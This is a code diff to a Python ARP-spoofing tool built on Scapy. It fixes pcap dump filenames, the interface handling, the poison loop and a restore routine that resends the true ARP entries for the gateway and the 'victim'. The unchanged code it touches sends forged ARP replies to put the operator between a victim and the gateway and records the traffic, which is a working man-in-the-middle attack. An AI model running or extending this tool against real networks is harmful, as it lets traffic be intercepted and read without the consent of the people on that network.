@@ -14,9 +14,10 @@ def get_unique_filename() -> str:
     '''
     timestamp = datetime.datetime.now().strftime('%d%m%Y')
     counter = 1
+    filename = f'dumps/arp-spoofing_{timestamp}.pcap'
     
-    while os.path.exists('dumps/' + filename):
-        filename = f'arp-spoofing_{timestamp}({counter}).pcap'
+    while os.path.exists(filename):
+        filename = f'dumps/arp-spoofing_{timestamp}({counter}).pcap'
         counter += 1
         
     return filename
@@ -35,21 +36,19 @@ class Arp:
             print_color('[!] Unable to get mac address of gateway, quitting...', 'red')
             sys.exit(0)
             
-        self.interface = interface
+        self.interface = interface['name']
         self.verbose = verbose
         self.count = count
         self.is_poisoning = True  
         self.filename = get_unique_filename()
         
-        conf.iface = interface
+        conf.iface = interface['name']
+        conf.verbose = 0
         if self.verbose:
-            conf.verbose = 1
-            print(f'Initialized {interface}:')
+            print(f'Initialized {interface["name"]}:')
             print(f'Gateway ({gateway}) is at {self.gateway_mac}')
             print(f'Victim ({victim}) is at {self.victim_mac}')
-            print('-'*30)     
-        else:
-            conf.verb = 0
+            print('-'*30)  
     
     def run(self) -> None:
         self.poison_thread = Process(target=self.poison)
@@ -91,14 +90,13 @@ class Arp:
             print('-'*30)
         print_color(f'\n[*] Beginning the ARP poison. Press CTRL+C to stop', 'green')
         
-        while self.is_poisoning:
+        while True:
             try:
                 send(poison_gateway)
                 send(poison_victim)
                 time.sleep(2)
                 
             except KeyboardInterrupt:
-                self.is_poisoning = False
                 time.sleep(1)
                 self.restore()
                 print('\n[*] Quitting...')
@@ -126,14 +124,14 @@ class Arp:
         send(ARP(
             op=2,
             psrc=self.gateway,
-            pdst=self.target,
+            pdst=self.victim,
             hwdst="ff:ff:ff:ff:ff:ff",
             hwsrc=self.gateway_mac),
             count=5)
         send(ARP(
             op=2,
-            psrc=self.target,
+            psrc=self.victim,
             pdst=self.gateway,
             hwdst="ff:ff:ff:ff:ff:ff",
-            hwsrc=self.target_mac),
+            hwsrc=self.victim_mac),
             count=5)
